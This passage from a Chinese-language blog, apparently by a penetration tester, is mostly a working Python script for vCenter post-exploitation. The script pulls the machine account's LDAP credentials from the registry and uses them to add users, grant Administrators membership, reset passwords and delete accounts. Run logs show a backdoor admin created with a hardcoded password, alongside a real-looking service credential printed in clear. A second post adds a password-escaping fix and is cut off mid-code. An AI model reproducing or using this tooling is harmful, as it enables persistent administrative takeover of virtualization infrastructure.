class="built_in">print</span>(ADDUSER)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Try to generate the ldif&quot;</span>)</span><br><span class="line">    fo = <span class="built_in">open</span>(<span class="string">&quot;adduser.ldif&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">    fo.write(ADDUSER)</span><br><span class="line">    fo.close()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Try to add the data&quot;</span>)</span><br><span class="line">    command = <span class="string">&quot;ldapadd -x -h &#123;dcAccount&#125; -D \&quot;&#123;dcAccountDN&#125;\&quot; -w \&quot;&#123;dcAccountPassword&#125;\&quot; -f adduser.ldif&quot;</span>.<span class="built_in">format</span>(dcAccount = dcAccount, dcAccountDN = dcAccountDN, dcAccountPassword = dcAccountPassword)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Command: &quot;</span> + command)</span><br><span class="line">    result = RunCommand(command)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Try to clean the ldif&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&quot;adduser.ldif&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nAll done.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] New user: &quot;</span> + userPrincipalName)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;    Password: P@ssWord123@@&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[!] Remember to add it as an admin&quot;</span>)    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddAdmin</span>():</span></span><br><span class="line">    dcAccount,dcAccountDN,dcAccountPassword = GetLDAPConfig()</span><br><span class="line">    base = dcAccountDN.split(<span class="string">&#x27;s,&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Try to generate the ldif&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Eg.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;   user dn: CN=test1,CN=Users,DC=aaa,DC=bbb&quot;</span>)</span><br><span class="line">      </span><br><span class="line">    dn = <span class="built_in">input</span>(<span class="string">&quot;input the user dn: &quot;</span>)</span><br><span class="line"></span><br><span class="line">    ADDADMIN = <span class="string">&#x27;&#x27;&#x27;dn: cn=Administrators,cn=Builtin,&#123;base&#125;</span></span><br><span class="line"><span class="string">changetype: modify</span></span><br><span class="line"><span class="string">add: member</span></span><br><span class="line"><span class="string">member: &#123;dn&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    ADDADMIN = ADDADMIN.<span class="built_in">format</span>(base = base, dn = dn) </span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Confirm the ldif&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(ADDADMIN)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Try to generate the ldif&quot;</span>)</span><br><span class="line">    fo = <span class="built_in">open</span>(<span class="string">&quot;addadmin.ldif&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">    fo.write(ADDADMIN)</span><br><span class="line">    fo.close()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Try to modify the data&quot;</span>)</span><br><span class="line">    command = <span class="string">&quot;ldapmodify -x -h &#123;dcAccount&#125; -D \&quot;&#123;dcAccountDN&#125;\&quot; -w \&quot;&#123;dcAccountPassword&#125;\&quot; -f addadmin.ldif&quot;</span>.<span class="built_in">format</span>(dcAccount = dcAccount, dcAccountDN = dcAccountDN, dcAccountPassword = dcAccountPassword)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Command: &quot;</span> + command)</span><br><span class="line">    result = RunCommand(command)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Try to clean the ldif&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&quot;addadmin.ldif&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nAll done.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ChangePass</span>():</span></span><br><span class="line">    dcAccount,dcAccountDN,dcAccountPassword = GetLDAPConfig()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Try to generate the ldif&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Eg.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;   user dn: CN=test1,CN=Users,DC=aaa,DC=bbb&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;   new password: P@ssWord123@@45&quot;</span>)</span><br><span class="line">      </span><br><span class="line">    dn = <span class="built_in">input</span>(<span class="string">&quot;input the user dn: &quot;</span>)</span><br><span class="line">    newpassword = <span class="built_in">input</span>(<span class="string">&quot;input the new password: &quot;</span>)</span><br><span class="line"></span><br><span class="line">    CHANGEPASS = <span class="string">&#x27;&#x27;&#x27;dn: &#123;dn&#125;</span></span><br><span class="line"><span class="string">changetype: modify</span></span><br><span class="line"><span class="string">replace: userPassword</span></span><br><span class="line"><span class="string">userPassword: &#123;newpassword&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    CHANGEPASS = CHANGEPASS.<span class="built_in">format</span>(dn = dn, newpassword = newpassword) </span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Confirm the ldif&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(CHANGEPASS)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Try to generate the ldif&quot;</span>)</span><br><span class="line">    fo = <span class="built_in">open</span>(<span class="string">&quot;changepass.ldif&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">    fo.write(CHANGEPASS)</span><br><span class="line">    fo.close()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Try to modify the data&quot;</span>)</span><br><span class="line">    command = <span class="string">&quot;ldapmodify -x -h &#123;dcAccount&#125; -D \&quot;&#123;dcAccountDN&#125;\&quot; -w \&quot;&#123;dcAccountPassword&#125;\&quot; -f changepass.ldif&quot;</span>.<span class="built_in">format</span>(dcAccount = dcAccount, dcAccountDN = dcAccountDN, dcAccountPassword = dcAccountPassword)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Command: &quot;</span> + command)</span><br><span class="line">    result = RunCommand(command)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Try to clean the ldif&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&quot;changepass.ldif&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nAll done.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] User: &quot;</span> + dn)    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] New Password: &quot;</span> + newpassword)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DeleteUser</span>():</span></span><br><span class="line">    dcAccount,dcAccountDN,dcAccountPassword = GetLDAPConfig()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Try to input the user dn&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Eg.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;   user dn: CN=test1,CN=Users,DC=aaa,DC=bbb&quot;</span>)</span><br><span class="line">    dn = <span class="built_in">input</span>(<span class="string">&quot;input the user dn: &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Try to delete the data&quot;</span>)</span><br><span class="line">    command = <span class="string">&quot;ldapdelete -x -h &#123;dcAccount&#125; -D \&quot;&#123;dcAccountDN&#125;\&quot; -w \&quot;&#123;dcAccountPassword&#125;\&quot; \&quot;&#123;dn&#125;\&quot;&quot;</span>.<span class="built_in">format</span>(dcAccount = dcAccount, dcAccountDN = dcAccountDN, dcAccountPassword = dcAccountPassword, dn = dn)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Command: &quot;</span> + command)</span><br><span class="line">    result = RunCommand(command)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nAll done.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetAdmin</span>():</span></span><br><span class="line">    dcAccount,dcAccountDN,dcAccountPassword = GetLDAPConfig()</span><br><span class="line">    base = dcAccountDN.split(<span class="string">&#x27;s,&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">    adminbase = <span class="string">&quot;cn=Administrators,cn=Builtin,&quot;</span> + base</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Try to get the data&quot;</span>)</span><br><span class="line">    command = <span class="string">&quot;ldapsearch -x -h &#123;dcAccount&#125; -D \&quot;&#123;dcAccountDN&#125;\&quot; -w \&quot;&#123;dcAccountPassword&#125;\&quot; -b \&quot;&#123;adminbase&#125;\&quot;&quot;</span>.<span class="built_in">format</span>(dcAccount = dcAccount, dcAccountDN = dcAccountDN, dcAccountPassword = dcAccountPassword, adminbase = adminbase)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Command: &quot;</span> + command)</span><br><span class="line">    result = RunCommand(command)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Admin User:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    pattern_name = re.<span class="built_in">compile</span>(<span class="string">r&quot;member: (.*?),&quot;</span>)</span><br><span class="line">    name = pattern_name.findall(result)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name)):       </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot; -  %s&quot;</span>%(name[i][<span class="number">3</span>:]))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nAll done.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GetUser</span>():</span></span><br><span class="line">    dcAccount,dcAccountDN,dcAccountPassword = GetLDAPConfig()</span><br><span class="line">    base = dcAccountDN.split(<span class="string">&#x27;s,&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">    adminbase = <span class="string">&quot;cn=Users,&quot;</span> + base</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Try to get the data&quot;</span>)</span><br><span class="line">    command = <span class="string">&quot;ldapsearch -x -h &#123;dcAccount&#125; -D \&quot;&#123;dcAccountDN&#125;\&quot; -w \&quot;&#123;dcAccountPassword&#125;\&quot; -b \&quot;&#123;adminbase&#125;\&quot;&quot;</span>.<span class="built_in">format</span>(dcAccount = dcAccount, dcAccountDN = dcAccountDN, dcAccountPassword = dcAccountPassword, adminbase = adminbase)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Command: &quot;</span> + command)</span><br><span class="line">    result = RunCommand(command)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] User:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    pattern_name = re.<span class="built_in">compile</span>(<span class="string">r&quot;dn: (.*?),&quot;</span>)</span><br><span class="line">    name = pattern_name.findall(result)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(name)):       </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot; -  %s&quot;</span>%(name[i][<span class="number">3</span>:]))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nAll done.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)!=<span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;vCenterLDAP_Manage.py&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Use to manage the LDAP database.&quot;</span>)       </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%s &lt;mode&gt;&quot;</span>%(sys.argv[<span class="number">0</span>]))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;mode:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;- adduser&quot;</span>)        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;- addadmin&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;- changepass&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;- deleteuser&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;- getadmin&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;- getuser&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Eg.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%s adduser&quot;</span>%(sys.argv[<span class="number">0</span>]))      </span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;adduser&quot;</span>:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Try to add a user&quot;</span>)</span><br><span class="line">            AddUser()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;addadmin&quot;</span>:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Try to add a user as an admin&quot;</span>)</span><br><span class="line">            AddAdmin()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;changepass&quot;</span>:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Try to change the password&quot;</span>)</span><br><span class="line">            ChangePass()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;deleteuser&quot;</span>:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Try to delete the user&quot;</span>)</span><br><span class="line">            DeleteUser()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;getadmin&quot;</span>:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Try to list the admin user&quot;</span>)</span><br><span class="line">            GetAdmin()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;getuser&quot;</span>:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Try to list the user&quot;</span>)</span><br><span class="line">            GetUser()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] Wrong parameter&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>修改完成后正常列用户：</p>
<p><img src="/2022/06/11/vCenterLDAP-Manage-Fix/image-20220611175926549.png" alt="image-20220611175926549"></p>
<p><img src="/2022/06/11/vCenterLDAP-Manage-Fix/image-20220611180048431.png" alt="image-20220611180048431"></p>
<p>添加用户：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">python update.py adduser</span><br><span class="line">[*] Try to add a user</span><br><span class="line">[*] Try to get the config of LDAP</span><br><span class="line">[+] dcAccount: v-vcenter55.pima-domain.local</span><br><span class="line">[+] dcAccountDN: cn=v-vcenter55.pima-domain.local,ou=Domain Controllers,dc=vsphere,dc=<span class="built_in">local</span></span><br><span class="line">[+] dcAccountPassword: Epdj3YPws&amp;\\a3\<span class="variable">$FY</span>\&quot;c%N</span><br><span class="line">[*] Try to generate the ldif</span><br><span class="line">Eg.</span><br><span class="line">   username: test1</span><br><span class="line">   dn: CN=test1,CN=Users,DC=aaa,DC=bbb</span><br><span class="line">   userPrincipalName: test1@AAA.BBB</span><br><span class="line">input the new username: testgg</span><br><span class="line">input the dn: cn=testgg,cn=Users,dc=vsphere,dc=<span class="built_in">local</span></span><br><span class="line">input the userPrincipalName: testgg@vsphere.local</span><br><span class="line">[*] Confirm the ldif</span><br><span class="line">dn: cn=testgg,cn=Users,dc=vsphere,dc=<span class="built_in">local</span></span><br><span class="line">userPrincipalName: testgg@vsphere.local</span><br><span class="line">sAMAccountName: testgg</span><br><span class="line">cn: testgg</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: person</span><br><span class="line">objectClass: organizationalPerson</span><br><span class="line">objectClass: user</span><br><span class="line">userPassword: P@ssWord123@@</span><br><span class="line"></span><br><span class="line">[*] Try to generate the ldif</span><br><span class="line">[*] Try to add the data</span><br><span class="line">[+] Command: ldapadd -x -h v-vcenter55.pima-domain.local -D <span class="string">&quot;cn=v-vcenter55.pima-domain.local,ou=Domain Controllers,dc=vsphere,dc=local&quot;</span> -w <span class="string">&quot;Epdj3YPws&amp;\\a3\$FY\&quot;c%N&quot;</span> -f adduser.ldif</span><br><span class="line">adding new entry <span class="string">&quot;cn=testgg,cn=Users,dc=vsphere,dc=local&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Try to clean the ldif</span><br><span class="line"></span><br><span class="line">All <span class="keyword">done</span>.</span><br><span class="line">[+] New user: testgg@vsphere.local</span><br><span class="line">    Password: P@ssWord123@@</span><br><span class="line">[!] Remember to add it as an admin</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>添加管理：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> python update.py addadmin</span><br><span class="line">[*] Try to add a user as an admin</span><br><span class="line">[*] Try to get the config of LDAP</span><br><span class="line">[+] dcAccount: v-vcenter55.pima-domain.local</span><br><span class="line">[+] dcAccountDN: cn=v-vcenter55.pima-domain.local,ou=Domain Controllers,dc=vsphere,dc=<span class="built_in">local</span></span><br><span class="line">[+] dcAccountPassword: Epdj3YPws&amp;\\a3\<span class="variable">$FY</span>\&quot;c%N</span><br><span class="line">[*] Try to generate the ldif</span><br><span class="line">Eg.</span><br><span class="line">   user dn: CN=test1,CN=Users,DC=aaa,DC=bbb</span><br><span class="line">input the user dn: cn=testgg,cn=Users,dc=vsphere,dc=<span class="built_in">local</span></span><br><span class="line">[*] Confirm the ldif</span><br><span class="line">dn: cn=Administrators,cn=Builtin,dc=vsphere,dc=<span class="built_in">local</span></span><br><span class="line">changetype: modify</span><br><span class="line">add: member</span><br><span class="line">member: cn=testgg,cn=Users,dc=vsphere,dc=<span class="built_in">local</span></span><br><span class="line"></span><br><span class="line">[*] Try to generate the ldif</span><br><span class="line">[*] Try to modify the data</span><br><span class="line">[+] Command: ldapmodify -x -h v-vcenter55.pima-domain.local -D <span class="string">&quot;cn=v-vcenter55.pima-domain.local,ou=Domain Controllers,dc=vsphere,dc=local&quot;</span> -w <span class="string">&quot;Epdj3YPws&amp;\\a3\$FY\&quot;c%N&quot;</span> -f addadmin.ldif</span><br><span class="line">modifying entry <span class="string">&quot;cn=Administrators,cn=Builtin,dc=vsphere,dc=local&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Try to clean the ldif</span><br><span class="line"></span><br><span class="line">All <span class="keyword">done</span>.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>管理员登录：</p>
<p><a href="mailto:&#116;&#x65;&#x73;&#x74;&#103;&#103;&#64;&#x76;&#115;&#x70;&#x68;&#x65;&#x72;&#x65;&#46;&#x6c;&#x6f;&#99;&#x61;&#108;">&#116;&#x65;&#x73;&#x74;&#103;&#103;&#64;&#x76;&#115;&#x70;&#x68;&#x65;&#x72;&#x65;&#46;&#x6c;&#x6f;&#99;&#x61;&#108;</a>/P@ssWord123@@</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/vCenter/" rel="tag">vCenter</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-vCenterLDAP-Manage-Fix2" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2022/06/11/vCenterLDAP-Manage-Fix2/" class="article-date">
  	<time datetime="2022-06-11T09:41:01.000Z" itemprop="datePublished">2022-06-11</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/06/11/vCenterLDAP-Manage-Fix2/">
        vCenterLDAP_Manage_Fix(二)
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>上一篇文章写完之后发现密码中有空格也会影响到脚本执行。</p>
<p><img src="/2022/06/11/vCenterLDAP-Manage-Fix2/image-20220613104850685.png" alt="image-20220613104850685"></p>
<p>使用正则表达式解决了dcAccountPassword中存在空格和反引号的问题，目前没有发现还有其他符号会干扰结果执行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dcAccountPassword: K)Sc7&gt;~&gt;?d\`9T0vRs<span class="comment"># p</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/11/vCenterLDAP-Manage-Fix2/image-20220613104828072.png" alt="image-20220613104828072"></p>
<p>Fix：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">result = RunCommand(<span class="string">&quot;/opt/likewise/bin/lwregshell list_values &#x27;[HKEY_THIS_MACHINE\\services\\vmdir]&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&quot;dcAccount&quot;.*?&quot;(.*)&quot;&#x27;</span>)</span><br><span class="line">dcAccount = pattern.findall(result)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&quot;dcAccountDN&quot;.*?&quot;(.*)&quot;&#x27;</span>)</span><br><span class="line">dcAccountDN = pattern.findall(result)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&quot;dcAccountPassword&quot;.*?&quot;(.*)&quot;&#x27;</span>)</span><br><span class="line">dcAccountPassword = pattern.findall(result)[<span class="number">0</span>].replace(<span class="string">&quot;$&quot;</span>, <span class="string">&#x27;\\$&#x27;</span>).replace(<span class="string">&quot;`&quot;</span>, <span class="string">&#x27;\\`&#x27;</span>)</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>vCenterLDAP_Manage_FixPass_Pro.py完整代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span 